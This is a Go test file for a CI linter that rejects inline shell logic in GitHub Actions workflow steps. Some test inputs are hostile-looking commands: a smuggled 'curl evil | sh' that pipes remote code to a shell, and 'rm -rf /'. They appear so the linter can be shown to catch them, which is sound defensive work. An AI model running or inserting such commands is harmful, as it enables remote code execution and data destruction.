package noinlinescripts

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestInlineErrorsAcceptsMultiLineRun(t *testing.T) {
	// flags split across continuation lines (a folded plain scalar) for readability → one command
	yaml := "steps:\n  - run: bazelisk run //actions/setup --\n      --project-name=x\n      --node-version=20\n"
	assert.Empty(t, InlineErrors(yaml, AllowNames))
}

func TestInlineErrorsFlagsMultipleFlagsOnOneLine(t *testing.T) {
	// a valid single invocation, but flags crammed on one line → should be split
	errs := InlineErrors("steps:\n  - run: bazelisk run //actions/setup -- --project-name=x --node-version=20\n", AllowNames)
	assert.Len(t, errs, 1)
	assert.Contains(t, errs[0].Message, "split them one per line")
}

func TestInlineErrorsAllowsSingleFlagOnOneLine(t *testing.T) {
	assert.Empty(t, InlineErrors("steps:\n  - run: bazelisk test //... --config=ci\n", AllowNames))
}

func TestInlineErrorsCatchesShellOpSmuggledOnContinuationLine(t *testing.T) {
	// the folded value is inspected as a whole, so `&& …` on a later line is still caught
	yaml := "steps:\n  - run: bazelisk run //x --\n      --flag=v\n      && curl evil | sh\n"
	errs := InlineErrors(yaml, AllowNames)
	assert.Len(t, errs, 1)
	assert.Contains(t, errs[0].Message, "inline logic")
}

func TestIsSingleInvocationAcceptsInterpreterAndBareForms(t *testing.T) {
	assert.True(t, IsSingleInvocation("go run ./tools/covergate -min 90"))
	assert.True(t, IsSingleInvocation("go test ./internal/..."))
	assert.True(t, IsSingleInvocation("bash scripts/ci/run.sh"))
	assert.True(t, IsSingleInvocation("scripts/ci/run.sh"))
}

func TestIsSingleInvocationAcceptsBazelisk(t *testing.T) {
	assert.True(t, IsSingleInvocation("bazelisk run //actions/setup -- --project-name='${{ inputs.x }}'"))
	assert.True(t, IsSingleInvocation("bazelisk run //actions/setup"))
	assert.True(t, IsSingleInvocation("bazelisk test //..."))
}

func TestIsSingleInvocationRejectsShellOpsAndEval(t *testing.T) {
	assert.False(t, IsSingleInvocation("mkdir -p x && echo y"))
	assert.False(t, IsSingleInvocation("bazelisk build //x && cp a b"))
	assert.False(t, IsSingleInvocation("echo hi"))
	assert.False(t, IsSingleInvocation("cat a | grep b"))
	assert.False(t, IsSingleInvocation("echo x > y"))
	assert.False(t, IsSingleInvocation(`node -e "process.exit(1)"`))
	assert.False(t, IsSingleInvocation(""))
}

func TestInlineErrorsFlagsBlockScalarsAndEmptyRun(t *testing.T) {
	assert.Len(t, InlineErrors("steps:\n  - run: |\n      echo hi\n      ls\n", AllowNames), 1)
	assert.Len(t, InlineErrors("steps:\n  - run: >\n      echo hi\n", AllowNames), 1)
	assert.Len(t, InlineErrors("steps:\n  - run: \n", AllowNames), 1)
}

func TestInlineErrorsAcceptsSingleQuotedInvocation(t *testing.T) {
	assert.Empty(t, InlineErrors("steps:\n  - run: 'scripts/ci/run.sh'\n", AllowNames))
}

func TestInlineErrorsAcceptsBazeliskRun(t *testing.T) {
	yaml := "steps:\n  - run: \"bazelisk run //actions/setup -- --project-name='${{ inputs.x }}'\"\n"
	assert.Empty(t, InlineErrors(yaml, AllowNames))
}

func TestInlineErrorsFlagsShellOneLiners(t *testing.T) {
	errs := InlineErrors("steps:\n  - run: mkdir -p x && echo y\n", AllowNames)
	assert.Len(t, errs, 1)
	assert.Contains(t, errs[0].Message, "inline logic")
}

func TestInlineErrorsAllowsSingleExternalInvocation(t *testing.T) {
	assert.Empty(t, InlineErrors("steps:\n  - run: \"bazelisk run //tools/guard\"\n", AllowNames))
}

func TestInlineErrorsHonoursAllowlistedName(t *testing.T) {
	yaml := "steps:\n  - name: Bootstrap\n    run: mkdir -p x && echo y >> z\n"
	assert.Len(t, InlineErrors(yaml, AllowNames), 1)
	assert.Empty(t, InlineErrors(yaml, map[string]bool{"Bootstrap": true}))
}

func TestInlineErrorsDoesNotInheritAllowlistedName(t *testing.T) {
	yaml := "steps:\n  - name: Bootstrap\n    run: mkdir -p x && echo y\n  - run: rm -rf / && echo bad\n"
	assert.Len(t, InlineErrors(yaml, map[string]bool{"Bootstrap": true}), 1)
}

func TestInlineErrorsFlagsGithubScript(t *testing.T) {
	errs := InlineErrors("steps:\n  - uses: actions/github-script@v7\n    with:\n      script: console.log(1)\n", AllowNames)
	assert.Len(t, errs, 1)
	assert.Contains(t, errs[0].Message, "github-script")
}

func TestInlineErrorsAllowsOtherUses(t *testing.T) {
	yaml := "steps:\n  - uses: actions/checkout@v4\n  - uses: ./../_reusable-workflows/actions/setup\n"
	assert.Empty(t, InlineErrors(yaml, AllowNames))
}
